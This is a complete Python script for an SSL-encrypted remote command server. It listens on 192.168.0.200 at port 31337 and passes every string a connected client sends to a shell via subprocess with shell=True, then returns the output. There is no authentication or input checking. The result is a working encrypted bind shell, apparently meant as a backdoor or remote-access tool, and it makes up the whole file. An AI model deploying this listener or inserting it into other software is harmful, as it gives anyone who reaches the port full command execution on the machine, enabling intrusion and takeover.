import socket
import ssl
import subprocess
import sys
import logging

# Configure logger
logging.basicConfig(
    level=logging.INFO,  # Set the logging level
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log"),  # Log to a file
        logging.StreamHandler(sys.stdout)   # Also log to the console
    ]
)

class CommandExecutor:
    """Executes shell commands and returns the output or error."""
    @staticmethod
    def execute_command(command, standard_input=None):
        try:
            pipe = subprocess.PIPE if standard_input else None
            process = subprocess.Popen(command, shell=True, stdin=pipe, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate(input=standard_input.encode() if standard_input else None)

            if error:
                logging.error(f"Command execution error: {error.decode()}")
                return error.decode()
            return output.decode()
        except Exception as e:
            logging.error(f"Failed to execute command: {command}. Exception: {e}")
            return f"Error executing command: {e}"

class SSLServer:
    """Creates an SSL-enabled server that accepts connections and processes commands."""
    def __init__(self, host, port, certfile, keyfile):
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.server_socket = None
        self.ssl_context = None

    def setup_server(self):
        """Sets up the server socket and SSL context."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(1)
            logging.info(f"Server started on {self.host}:{self.port}")

            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.ssl_context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
        except Exception as e:
            logging.critical(f"Error setting up server: {e}")
            sys.exit(1)

    def handle_client(self, client_socket, client_address):
        """Handles communication with a connected SSL client."""
        ssl_socket = self.ssl_context.wrap_socket(client_socket, server_side=True)
        logging.info(f"Accepted SSL connection from {client_address}")

        try:
            while True:
                data = ssl_socket.recv(16804)
                if not data:
                    break
                command = data.decode().strip()
                logging.info(f"Received command: {command}")

                # Execute the received command
                reply = CommandExecutor.execute_command(command)

                # Send the reply back to the client
                if reply:
                    ssl_socket.sendall(reply.encode())
        except Exception as e:
            logging.error(f"Error during communication with client {client_address}: {e}")
        finally:
            ssl_socket.close()
            logging.info(f"Closed SSL connection with {client_address}")

    def run(self):
        """Runs the server to accept client connections."""
        self.setup_server()
        try:
            while True:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    self.handle_client(client_socket, client_address)
                except Exception as e:
                    logging.error(f"Error accepting connection: {e}")
        except KeyboardInterrupt:
            logging.info("Server is shutting down...")
        finally:
            self.server_socket.close()
            logging.info("Server socket closed.")

if __name__ == '__main__':
    # Instantiate and run the SSL server
    host = '192.168.0.200'
    port = 31337
    certfile = 'server.crt'
    keyfile = 'server.key'

    server = SSLServer(host, port, certfile, keyfile)
    server.run()
